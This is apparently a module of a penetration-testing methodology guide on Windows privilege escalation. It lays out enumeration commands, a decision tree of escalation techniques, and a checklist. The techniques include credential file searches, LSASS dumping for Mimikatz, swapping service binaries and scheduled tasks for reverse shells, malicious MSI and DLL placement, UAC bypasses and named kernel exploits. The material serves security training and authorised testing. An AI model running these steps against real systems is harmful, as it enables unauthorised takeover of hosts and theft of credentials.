# Module 10: Windows Privilege Escalation

## When to Use This Module
Use this module when you have a non-administrative shell on a Windows system. The goal is to escalate privileges to Local Administrator, NT AUTHORITY\SYSTEM, or another higher-privileged user.

## Prerequisites
- Working shell on target (reverse/bind/WinRM/RDP) — from Module 05
- PowerShell available (may be restricted)
- File transfer method available (Module 05)

## Entry Check

```
Shell obtained on Windows host?
├── Run initial enumeration:
│   ├── whoami → Current user
│   ├── whoami /priv → Current privileges
│   ├── whoami /groups → Group memberships
│   ├── hostname → System name
│   ├── systeminfo → OS version, patch level
│   ├── net users → Local users
│   ├── net localgroup Administrators → Local admins
│   ├── ipconfig → Network configuration
│   └── netstat -ano → Active connections
│
├── Automated enumeration:
│   ├── winPEASany.exe → Run it
│   ├── Seatbelt.exe → Run it
│   └── PowerUp.ps1 → IEX (import-module) → Invoke-AllChecks
│
├── Check domain join:
│   ├── systeminfo | findstr Domain
│   └── If domain joined → Check Module 11
│
└── Begin systematic check of each privesc vector
```

## PrivEsc Vector Decision Tree

```
Need to escalate privileges?
├── Check EACH of these vectors:
│
│   1. Token privileges
│   ├── whoami /priv
│   ├── SeImpersonatePrivilege?
│   │   ├── Windows ≤ 2016 → JuicyPotato
│   │   ├── Windows 2019+ → PrintSpoofer / GodPotato
│   │   └── Any → RoguePotato / SweetPotato
│   ├── SeDebugPrivilege?
│   │   ├── ProcDump LSASS → minidump → Mimikatz offline
│   │   └── psgetsystem → Spawn SYSTEM shell
│   ├── SeBackupPrivilege?
│   │   └── robocopy /B to backup SAM/SYSTEM
│   ├── SeTakeOwnershipPrivilege?
│   │   └── takeown + icacls on protected files
│   ├── SeRestorePrivilege?
│   │   └── Write files to protected locations
│   └── SeLoadDriverPrivilege?
│       └── Capcom.sys → Load kernel driver → SYSTEM
│
│   2. Service misconfigurations
│   ├── Unquoted service path?
│   │   ├── wmic service get name,pathname | findstr /i /v "C:\Program Files"
│   │   └── Insert malicious exe in writable path portion
│   ├── Writable service binary?
│   │   ├── sc qc <service> → Check binary_path_name
│   │   ├── icacls <binary> → Check if writable
│   │   └── Replace with reverse shell binary
│   ├── Writable service config?
│   │   ├── sc config <service> binpath= "cmd /c reverse_shell"
│   │   └── Requires SERVICE_ALL_ACCESS
│   └── AlwaysInstallElevated?
│       ├── Check both HKLM and HKCU
│       └── Create malicious MSI → msiexec /quiet /qn /i install.msi
│
│   3. Stored credentials
│   ├── cmdkey /list → Stored creds
│   ├── findstr /si password *.txt *.ini *.config
│   ├── PowerShell history: (Get-PSReadlineOption).HistorySavePath
│   ├── Unattended install files: Unattend.xml
│   ├── Group Policy preferences: groups.xml (password in cpassword)
│   └── gpp-decrypt <cpassword>
│
│   4. DLL hijacking
│   ├── Process Monitor → Missing DLLs
│   ├── Identify writable path in search order
│   └── Place malicious DLL
│
│   5. Scheduled tasks
│   ├── schtasks /query /fo LIST /v
│   ├── Check for writable scripts run as SYSTEM
│   └── Replace with reverse shell
│
│   6. Registry autoruns
│   ├── reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
│   ├── Check for writable autorun paths
│   └── Replace with malicious binary
│
│   7. UAC bypass
│   ├── Check EnableLUA = 1? → UAC enabled
│   ├── Check if admin but filtered token
│   └── Use UAC bypass techniques:
│       ├── fodhelper.exe
│       ├── computerdefaults.exe
│       └── sdclt.exe
│
│   8. Kernel exploits
│   ├── searchsploit windows kernel <version>
│   ├── systeminfo → Check patch level with Watson
│   ├── Common CVEs:
│   │   ├── CVE-2021-36934 (HiveNightmare) → SAM read
│   │   ├── CVE-2021-34527 (PrintNightmare)
│   │   └── MS17-010 (EternalBlue) → SMB RCE
│   └── Use Windows Exploit Suggester
│
│   9. Group abuse
│   ├── DnsAdmins?
│   │   └── dnscmd /config /serverlevelplugindll → SYSTEM
│   ├── Server Operators?
│   │   └── sc config on DC services
│   ├── Print Operators?
│   │   └── SeLoadDriverPrivilege → SYSTEM
│   └── Backup Operators?
│       └── robocopy /B → Domain backup
│
│   10. Named pipe abuse
│   ├── Find writable pipes
│   └── Impersonation via pipe
│
└── None worked? → Re-enumerate
    ├── Run winPEAS if you haven't
    ├── Check all user directories for stored creds
    ├── Check registry for passwords
    ├── Check IIS logs for sensitive data
    └── Check mounted VHDX/VMDK files for SAM
```

## Key Commands

```powershell
# Service enumeration
wmic service get name,displayname,pathname,startname
Get-Service
Get-CimInstance -ClassName Win32_Service

# Running processes
Get-Process
tasklist /SVC

# Network connections
netstat -ano

# Writable service binary check
icacls "C:\Program Files\SomeService\service.exe"

# Unquoted service path check
wmic service get name,pathname | findstr /i /v "C:\Program Files"

# Registry check for auto-start
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Local admin group
net localgroup Administrators

# Password in files
findstr /si password *.txt *.ini *.config *.xml
```

## Cross-References
- For post-exploitation after admin → [Module 13: Post-Exploitation](../modules/13-post-exploitation.md)
- For AD attacks if domain-joined → [Module 11: Active Directory](../modules/11-active-directory.md)
- For lateral movement → [Module 12: Lateral Movement & Pivoting](../modules/12-lateral-pivot.md)
- For password cracking → [Module 06: Password Attacks](../modules/06-password-attacks.md)

## Output Summary
- [ ] Initial enumeration complete
- [ ] Token privileges checked (SeImpersonate, SeDebug, etc.)
- [ ] Service misconfigurations checked (unquoted paths, writable binaries)
- [ ] Stored credentials searched
- [ ] Scheduled tasks enumerated
- [ ] Kernel exploits checked via Windows Exploit Suggester
- [ ] UAC bypass attempted (if needed)
- [ ] All findings documented
- [ ] Admin/SYSTEM access achieved (or confirmed no path)
